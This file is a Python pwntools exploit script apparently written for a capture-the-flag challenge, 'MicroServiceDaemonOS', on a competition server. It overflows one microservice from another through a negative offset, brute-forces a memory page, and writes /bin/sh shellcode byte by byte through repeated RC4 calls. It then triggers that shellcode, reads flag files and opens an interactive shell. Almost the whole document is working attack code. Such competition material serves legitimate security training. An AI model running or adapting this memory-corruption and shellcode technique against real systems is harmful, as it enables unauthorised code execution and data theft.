#!/usr/bin/env python

from pwn import *
from struct import *
import re, base64

__LIBC__ = ""
__NAME__ = "MicroServiceDaemonOS"
__REMOTE__ = "microservicedaemonos.ctfcompetition.com"
__REMOTE_PORT__ = 1337
__GDB__ = """
c
"""

context.arch = 'amd64'

if __name__ == "__main__":

	while(1):

		log.info("[+] pwning %s"  % __NAME__)

		if args.LIBC:
			__LIBC__ = ""

		if args.REMOTE:
			log.info("[+] remote run")
			r = remote(__REMOTE__, __REMOTE_PORT__)

		else:

			log.info("[+] local run")

			if args.GDB:
				if args.GDB == 'attach':
					r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})
					log.info("[~] attaching gdb...")
					gdb.attach(r.pid, __GDB__)

				else:
					r = gdb.debug("./%s" % __NAME__, __GDB__)
			else:
				r = process("./%s" % __NAME__, env={'LD_PRELOAD': __LIBC__})


		def cmd(x):
			#r.sendlineafter("Provide command: ", x)
			r.sendline(x)
		def trustlet(x):
			#r.sendlineafter("Provide type of trustlet: ", x)
			r.sendline(x)
		def idx(x):
			#r.sendlineafter("Provide index of ms: ", x)
			r.sendline(x)
		def ctype(x):
			#r.sendlineafter("Call type: ", x)
			r.sendline(x)
		def poff(x):
			#r.sendlineafter("Provide page offset: ", x)
			r.sendline(x)
		def pcount(x):
			r.sendlineafter("Provide page count: ", x)
			#r.sendline(x)
		def dsize(x):
			#r.sendlineafter("Provide data size: ", str(x))
			r.sendline(str(x))
		def doffset(x):
			r.sendlineafter("Provide data offset: ", str(x))
			#r.sendline(str(x))

		def seq_rc4(idx_, type, offset, count):
			cmd('c')
			idx(str(idx_))
			ctype(type)
			dsize(str(count))
			doffset(str(offset))
			r.send('A'*count)
			d = r.recvn(1)
			return d

		def seq_c(idx_, type, offset, count):
			cmd('c')
			idx(str(idx_))
			ctype(type)
			poff(str(offset))
			pcount(str(count))

		def seq_c_no_param(idx_, type):
			cmd('c')
			idx(str(idx_))
			ctype(type)

		def get_hash(offset):
			seq_c(0, "g", offset, 1)
			d = r.readuntil("\nProvide command: ")
			area_orig = d[:-len("\nProvide command: ")]
			r.sendline('a')
			return area_orig

		# create two services
		#
		# first is needed to catch overflowing offset

		cmd('l')
		trustlet('0')

		# the second should overflow first
		cmd('l')
		trustlet('1')

		area_orig = get_hash(0)

		log.info("[+] read %x bytes back" % len(area_orig))

		# let's overflow second
		#pause()
		seq_rc4(1, 's', -0x8000000, 1)

		# let's search the offset

		offset = None
		for i in range(0, 0x800): # 0x7ff8
			d = get_hash(i)
			if d != area_orig:
				log.info("[+] offset found! [%x] %s:%s" % (i, d, area_orig))

				log.info("check addr: %x" % (0x155505345000 + 0x8000 + (i<<12)))
				#pause()
				offset = i
				break

			if i % 100 == 0:
				log.info("[+] i: %x/0x7ff8", i)

		if offset == None:
			log.info("[+] no reason to continue due to 2min time limit, restarting...")
			r.close()
			continue

		shellcode = asm(shellcraft.sh())

		#context.log_level = "DEBUG"
		for i, c in enumerate(shellcode):

			while 1:
				cc = seq_rc4(1, 's', -(0x4000 + (offset << 12)) + i, 1)

				if c == cc:
					log.info("[+] crafted %d/%d" % (i, len(shellcode)))
					break

			#break


		log.info("[+] shellcode crafted [%d]" % len(shellcode))
		#pause()
		seq_c_no_param(1, "g")
		r.sendline("cat /home/*/*flag*")
		r.interactive()


"""
procs after sorting:

0x000055555555506c proc2
0x0000555555555290 proc1
0x0000555555555380 proc3
0x000055555555581a xor_to_char
0x0000555555556540 g_data (nop/break)

"""